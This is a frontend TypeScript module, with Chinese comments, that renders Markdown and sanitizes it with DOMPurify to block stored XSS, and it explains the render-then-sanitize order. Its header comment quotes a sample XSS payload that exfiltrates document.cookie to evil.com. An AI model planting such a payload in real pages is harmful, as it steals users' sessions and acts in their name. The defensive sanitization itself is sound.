/**
 * Markdown 渲染 + 清洗
 * ------------------------------------------------------------
 * ⚠️ 这个文件是安全边界，改动前先读 docs/security.md 的 R3。
 *
 * 为什么必须清洗？
 *   后端只存 Markdown **原文**，不做渲染。如果前端直接把渲染结果塞进
 *   v-html，任何作者都能在正文里写：
 *     <img src=x onerror="fetch('//evil.com?c='+document.cookie)">
 *   虽然 token 在 httpOnly cookie 里偷不到，但这段脚本可以**以当前用户身份
 *   发请求**（改文章、删文章）。这叫存储型 XSS，是内容站最典型的漏洞。
 *
 * 两道闸，缺一不可：
 *   1. markdown-it 的 html: false —— 原始 HTML 标签被当成普通文本转义，
 *      不会进入 DOM。这一步已经挡掉绝大多数攻击。
 *   2. DOMPurify.sanitize —— 兜底。即使哪天有人把 html 改成 true，
 *      或者某个插件生成了危险属性，这里还会再洗一遍。
 *
 * 顺序不能反：先渲染成 HTML，再清洗 HTML。
 *
 * 反过来的问题**不是**"一定会被 XSS"——实测这批载荷两种顺序都安全，
 * 因为 DOMPurify 会把 Markdown 源码当 HTML 解析，顺手也删掉了危险属性。
 * 真正的问题是两件事：
 *   1. **会篡改内容**：代码块里的示例被当 HTML 洗了一遍，
 *      `<img src=x onerror=alert(1)>` 变成 `<img src="x">`、`<a>` 的 href 被删。
 *      对一个讲 XSS 的技术博客来说，示例失真比报错更糟——它不报错，只是悄悄改内容。
 *   2. **会漏掉渲染期才产生的内容**：插件、linkify、自定义语法生成的标签，
 *      在"洗源码"的那一刻还不存在，所以原理上覆盖不到。
 *
 * 一句话：清洗的对象必须是「即将进入 DOM 的那个字符串」。
 */
import MarkdownIt from 'markdown-it'
import DOMPurify from 'dompurify'

const md = new MarkdownIt({
  // 不允许正文里写原始 HTML。这一条比任何黑名单都可靠
  html: false,
  // 自动把裸链接变成 <a>，作者不用手写 []()
  linkify: true,
  // 单个换行不当作 <br>，符合 Markdown 原意（中文写作常一段一行，开了会很碎）
  breaks: false,
  typographer: false,
})

/**
 * 渲染并清洗
 * @param source Markdown 原文
 * @returns 可以直接交给 v-html 的安全 HTML
 */
export function renderMarkdown(source: string): string {
  if (!source) return ''

  const rawHtml = md.render(source)

  return DOMPurify.sanitize(rawHtml, {
    // 允许的标签保持默认白名单即可（p/h1-h6/ul/ol/li/blockquote/pre/code/a/img/table...）
    // 额外允许 target / rel：默认白名单里没有 target，要给外链加"新窗口打开"就得加；
    // rel 一起加是为了能配 noopener（防 tabnabbing：新页面用 window.opener 把原页面导走）
    ADD_ATTR: ['target', 'rel'],
    /**
     * 协议白名单：只放行 http/https/mailto/tel 和相对路径。
     * ------------------------------------------------------------
     * 实测它的真实作用：把协议收窄到上面这几种，
     * 拦掉 DOMPurify 默认放行的 sms: / cid: / ftp:。
     *
     * ⚠️ 它**不负责**拦 data: —— 那层由 DOMPurify 内建逻辑管：
     *    只允许 img/audio/video 等标签使用 data:，且只允许 image/*、audio/*、video/* 媒体类型。
     *    所以 `data:image/svg+xml` 在 <img src> 上**仍然保留**（实测确认，两种配置都保留）。
     *
     *    这不算漏洞：<img> 里的 SVG 是静态图片上下文，按规范不执行脚本。
     *    真正危险的是把 data: 放进 <a href> 或 <iframe src>，那两个实测都会被删掉。
     */
    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i,
  })
}

/** 生成文章摘要用的纯文本（列表页兜底用，避免把 HTML 塞进摘要） */
export function toPlainText(source: string): string {
  return source
    .replace(/```[\s\S]*?```/g, ' ')
    .replace(/!\[[^\]]*\]\([^)]*\)/g, ' ')
    .replace(/\[([^\]]*)\]\([^)]*\)/g, '$1')
    .replace(/[#>*_`~-]/g, ' ')
    .replace(/\s+/g, ' ')
    .trim()
}
